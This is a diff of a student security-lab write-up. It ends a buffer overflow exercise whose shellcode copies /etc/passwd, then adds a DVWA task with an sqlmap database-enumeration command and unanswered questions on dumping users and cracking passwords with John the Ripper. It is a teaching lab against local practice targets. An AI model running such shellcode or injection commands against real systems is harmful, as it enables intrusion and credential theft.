@@ -119,3 +119,32 @@ run $(python3 -c "print('\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x6
 ```
 
 **Conclusion**: the /etc/passwd file will be copied to /tmp/pwfile. This demonstrates how a buffer overflow vulnerability can be exploited to execute arbitrary code.
+
+# Task 2: Attack on database of DVWA
+
+- Install dvwa (on host machine or docker container)
+- Make sure you can login with default user
+- Install sqlmap
+- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.
+
+**Question 1**: Use sqlmap to get information about all available databases
+**Answer 1**:
+
+**Idenrify a vulnerable URL** : Navigate to the DVWA SQL Injection page and find a URL that includes a parameter
+http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit.
+
+**Run sqlmap to enumerate databases:**
+Find PHPSESSID :
+
+<img width="500" alt="Screenshot" src=""><br>
+
+```
+sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<veum4ka5g5rqc8rcnghg20ch00>; security=low" --dbs
+
+```
+
+**Question 2**: Use sqlmap to get tables, users information
+**Answer 2**:
+
+**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
+**Answer 3**:
